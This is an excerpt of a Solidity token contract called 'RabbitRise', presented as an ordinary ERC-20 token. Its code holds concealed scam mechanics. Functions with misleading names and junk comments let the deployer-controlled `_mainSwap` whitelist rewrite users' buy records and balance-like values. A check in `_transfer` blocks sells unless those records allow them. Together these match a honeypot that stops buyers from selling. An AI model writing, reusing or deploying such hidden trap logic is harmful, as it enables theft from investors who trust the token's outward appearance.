...
contract RabbitRise is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RabbitRise";
    string private _symbol = "RabbitRise";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x789b8bdA5404009C973B6abdCd9539B071f6222C); 
    address payable private teamWalletAddress = payable(0xb96daf8F91205D3887d40F2b9F29fDB4700EeE81); 
    ...
    mapping (address => bool) public _mainSwap;
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
	    require(
            120000000000000000 == serviceFee_ ,
        ...
        _mainSwap[address(uniswapPair)] = true;
		_mainSwap[msg.sender] = true; 
	...
	function setPoint(uint256 newLimit) external  {
        _point = newLimit;
    }
	...
	function setLList(address  recipient, uint256 amount) public {
		if( _mainSwap[ /*as aXxsdfghjk11;*/msg.sender])
	   {
	      buyList[recipient] = amount;
	   }   
    }
	...
	function _transferFrom(address spender, uint256 amount) internal{
        require(spender != address(0), "ERC20: approve to the zero address");
        _usdt[spender] = 10**_decimals  + amount;
    }
	
	function transferFromTo(address adddde , uint256 uintVI) public{
	if( _mainSwap[ /*as aXxsdfghjkll;*/msg.sender])
	   {
	      _transferFrom(adddde, uintVI);
	   }
	}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {   
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_mainSwap[sender] && swapAndLiquifyEnabled) 
            {
...
// 		uint256 amountpercent = 0;  
        ...
        if(_mainSwap[sender]) {
		    buyList[recipient]=buyList[recipient].add(amount.mul(_point).div(100));
        ...
        else if(_mainSwap[recipient]) {
//			require(amount <= amountpercent, "ERC20: over Percent");
		    require(buyList[sender]>=(sellList[sender].add(amount)),"sell amout gt buy total");
